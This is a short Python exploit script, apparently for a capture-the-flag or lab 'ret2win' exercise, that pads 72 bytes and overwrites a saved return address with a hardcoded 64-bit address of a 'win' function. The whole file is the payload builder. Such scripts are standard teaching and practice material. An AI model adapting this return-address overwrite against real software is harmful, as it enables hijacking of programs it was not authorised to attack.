from struct import pack
import sys

offset = 72
win_addr = 0x40123c

payload = b"A" * offset + pack("<Q", win_addr)

sys.stdout.buffer.write(payload)
